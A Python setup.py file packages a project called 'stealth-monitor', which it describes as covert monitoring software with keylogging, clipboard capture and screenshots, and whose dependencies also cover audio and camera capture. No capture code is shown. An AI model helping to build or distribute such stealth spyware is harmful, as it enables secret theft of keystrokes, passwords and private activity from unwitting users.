from setuptools import setup, find_packages

setup(
    name='stealth-monitor',
    version='1.0.0',
    author='Your Name',
    author_email='your.email@example.com',
    description='A stealth system monitor with keylogging, clipboard capture, and screenshot capability.',
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',
    packages=find_packages(),
    install_requires=[
        'pynput',
        'pyautogui',
        'pyperclip',
        'pyaudio',
        'sounddevice',
        'opencv-python',
        'Pillow',
        'cryptography',
    ],
    classifiers=[
        'Programming Language :: Python :: 3',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.6',
    entry_points={
        'console_scripts': [
            'monitor=main:main'
        ],
    },
)
